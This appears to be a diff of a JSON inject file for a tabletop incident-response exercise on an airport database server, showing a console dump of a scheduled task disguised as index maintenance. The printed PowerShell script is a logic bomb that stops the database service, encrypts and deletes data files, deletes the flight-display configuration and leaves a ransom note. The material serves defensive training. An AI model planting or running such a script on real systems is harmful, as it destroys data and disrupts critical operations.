@@ -13,7 +13,7 @@
     "commands": [
       {
         "cmd": "Get-ScheduledTask -TaskName 'AODB_IndexMaintenance'",
-        "output": "TaskName : AODB_IndexMaintenance\nTaskPath : \\\\\\\\\\nState : Ready\nLastRunTime : 10/22/2026 09:00:00 AM\nNextRunTime : 10/22/2026 12:00:00 PM\nAuthor : svc_nexgen_aodb\nPrincipal : NT AUTHORITY\\SYSTEM\nAction : C:\\AODB\\Maintenance\\AODB_IndexMaintenance.ps1\nTrigger : Daily at 12:00:00 PM\nSettings : {RunOnlyIfNetworkAvailable, StopIfGoingOnBattery, ...}",
+        "output": "TaskName : AODB_IndexMaintenance\nTaskPath : \\\\\\\\\\nState : Ready\nLastRunTime : 10/20/2026 09:00:00 AM\nNextRunTime : 10/20/2026 12:00:00 PM\nAuthor : svc_nexgen_aodb\nPrincipal : NT AUTHORITY\\SYSTEM\nAction : C:\\AODB\\Maintenance\\AODB_IndexMaintenance.ps1\nTrigger : Daily at 12:00:00 PM\nSettings : {RunOnlyIfNetworkAvailable, StopIfGoingOnBattery, ...}",
         "error": false
       },
       {
@@ -23,12 +23,12 @@
       },
       {
         "cmd": "cat C:\\AODB\\Maintenance\\AODB_IndexMaintenance.ps1",
-        "output": "# AODB Index Maintenance Script\n# Created: 10/22/2026\n# Last Modified: 10/17/2026 (by svc_nexgen_aodb)\n# Purpose: Index optimization\n\n# Import required modules\nImport-Module -Name 'C:\\AODB\\Modules\\DBUtils.psm1'\n\n# Check for encryption key\nif (Test-Path 'C:\\AODB\\Keys\\aes256_key.dat') {\n $Key = Get-Content 'C:\\AODB\\Keys\\aes256_key.dat' -Raw\n} else {\n Write-Error 'Encryption key not found. Aborting.'\n exit 1\n}\n\n# Stop AODB service\nStop-Service -Name 'AODB_Service' -Force\n\n# Encrypt database files\n$Files = Get-ChildItem 'C:\\AODB\\Data\\' -Filter *.db\nforeach ($File in $Files) {\n $EncryptedPath = $File.FullName + '.enc'\n $Data = Get-Content $File.FullName -Raw\n $EncryptedData = ConvertTo-SecureString $Data -Key $Key -Encrypted\n Set-Content $EncryptedPath $EncryptedData\n Remove-Item $File.FullName\n}\n\n# Delete FIDS data feed configuration\nRemove-Item 'C:\\AODB\\Config\\FIDS_Config.xml' -Force\n\n# Drop ransom note\n$Note = 'You should have hired me. — D'\nNew-Item -Path 'C:\\Users\\Public\\Desktop\\README_NCIA.txt' -ItemType File -Value $Note\n\n# Exit\nexit 0",
+        "output": "# AODB Index Maintenance Script\n# Created: 10/20/2026\n# Last Modified: 10/17/2026 (by svc_nexgen_aodb)\n# Purpose: Index optimization\n\n# Import required modules\nImport-Module -Name 'C:\\AODB\\Modules\\DBUtils.psm1'\n\n# Check for encryption key\nif (Test-Path 'C:\\AODB\\Keys\\aes256_key.dat') {\n $Key = Get-Content 'C:\\AODB\\Keys\\aes256_key.dat' -Raw\n} else {\n Write-Error 'Encryption key not found. Aborting.'\n exit 1\n}\n\n# Stop AODB service\nStop-Service -Name 'AODB_Service' -Force\n\n# Encrypt database files\n$Files = Get-ChildItem 'C:\\AODB\\Data\\' -Filter *.db\nforeach ($File in $Files) {\n $EncryptedPath = $File.FullName + '.enc'\n $Data = Get-Content $File.FullName -Raw\n $EncryptedData = ConvertTo-SecureString $Data -Key $Key -Encrypted\n Set-Content $EncryptedPath $EncryptedData\n Remove-Item $File.FullName\n}\n\n# Delete FIDS data feed configuration\nRemove-Item 'C:\\AODB\\Config\\FIDS_Config.xml' -Force\n\n# Drop ransom note\n$Note = 'You should have hired me. — D'\nNew-Item -Path 'C:\\Users\\Public\\Desktop\\README_NCIA.txt' -ItemType File -Value $Note\n\n# Exit\nexit 0",
         "error": false
       },
       {
         "cmd": "Get-ChildItem 'C:\\Users\\Public\\Desktop\\' | Select-Object Name, LastWriteTime",
-        "output": "Name : README_NCIA.txt\nLastWriteTime : 10/22/2026 09:05:12 AM",
+        "output": "Name : README_NCIA.txt\nLastWriteTime : 10/20/2026 09:05:12 AM",
         "error": false
       }
     ],
@@ -99,9 +99,50 @@
         "instructorNote": "This is the critical inject. The team must now recognize the task, script, and ransom note as the logic bomb. Watch for the first team to attempt to delete the task or quarantine the script.",
         "deliveryMode": "hand_to_role"
       }
+    },
+    {
+      "at": "2026-10-23T19:49:17.579Z",
+      "by": "user",
+      "note": "Corrected by hand for the shipped example",
+      "snapshot": {
+        "title": "AODB Server: Suspicious Scheduled Task Found",
+        "type": "console_dump",
+        "fields": {
+          "windowTitle": "Administrator: Windows PowerShell",
+          "host": "NCIA-AEP-2025-01",
+          "user": "svc_nexgen_aodb",
+          "cwd": "C:\\AODB\\Maintenance",
+          "prompt": "PS C:\\AODB\\Maintenance>",
+          "commands": [
+            {
+              "cmd": "Get-ScheduledTask -TaskName 'AODB_IndexMaintenance'",
+              "output": "TaskName : AODB_IndexMaintenance\nTaskPath : \\\\\\\\\\nState : Ready\nLastRunTime : 10/20/2026 09:00:00 AM\nNextRunTime : 10/20/2026 12:00:00 PM\nAuthor : svc_nexgen_aodb\nPrincipal : NT AUTHORITY\\SYSTEM\nAction : C:\\AODB\\Maintenance\\AODB_IndexMaintenance.ps1\nTrigger : Daily at 12:00:00 PM\nSettings : {RunOnlyIfNetworkAvailable, StopIfGoingOnBattery, ...}",
+              "error": false
+            },
+            {
+              "cmd": "Get-ScheduledTask -TaskName 'AODB_IndexMaintenance' | Select-Object -ExpandProperty Action",
+              "output": "Path : C:\\AODB\\Maintenance\\AODB_IndexMaintenance.ps1\nArguments : \nWorkingDirectory : C:\\AODB\\Maintenance",
+              "error": false
+            },
+            {
+              "cmd": "cat C:\\AODB\\Maintenance\\AODB_IndexMaintenance.ps1",
+              "output": "# AODB Index Maintenance Script\n# Created: 10/20/2026\n# Last Modified: 10/17/2026 (by svc_nexgen_aodb)\n# Purpose: Index optimization\n\n# Import required modules\nImport-Module -Name 'C:\\AODB\\Modules\\DBUtils.psm1'\n\n# Check for encryption key\nif (Test-Path 'C:\\AODB\\Keys\\aes256_key.dat') {\n $Key = Get-Content 'C:\\AODB\\Keys\\aes256_key.dat' -Raw\n} else {\n Write-Error 'Encryption key not found. Aborting.'\n exit 1\n}\n\n# Stop AODB service\nStop-Service -Name 'AODB_Service' -Force\n\n# Encrypt database files\n$Files = Get-ChildItem 'C:\\AODB\\Data\\' -Filter *.db\nforeach ($File in $Files) {\n $EncryptedPath = $File.FullName + '.enc'\n $Data = Get-Content $File.FullName -Raw\n $EncryptedData = ConvertTo-SecureString $Data -Key $Key -Encrypted\n Set-Content $EncryptedPath $EncryptedData\n Remove-Item $File.FullName\n}\n\n# Delete FIDS data feed configuration\nRemove-Item 'C:\\AODB\\Config\\FIDS_Config.xml' -Force\n\n# Drop ransom note\n$Note = 'You should have hired me. — D'\nNew-Item -Path 'C:\\Users\\Public\\Desktop\\README_NCIA.txt' -ItemType File -Value $Note\n\n# Exit\nexit 0",
+              "error": false
+            },
+            {
+              "cmd": "Get-ChildItem 'C:\\Users\\Public\\Desktop\\' | Select-Object Name, LastWriteTime",
+              "output": "Name : README_NCIA.txt\nLastWriteTime : 10/20/2026 09:05:12 AM",
+              "error": false
+            }
+          ],
+          "showCursor": true
+        },
+        "instructorNote": "This is the critical inject. The team must now recognize the task, script, and ransom note as the logic bomb. Watch for the first team to attempt to delete the task or quarantine the script.",
+        "deliveryMode": "hand_to_role"
+      }
     }
   ],
   "includeInDeck": true,
   "locked": false,
-  "updatedAt": "2026-10-22T14:08:23.435Z"
+  "updatedAt": "2026-10-23T19:49:19.963Z"
 }
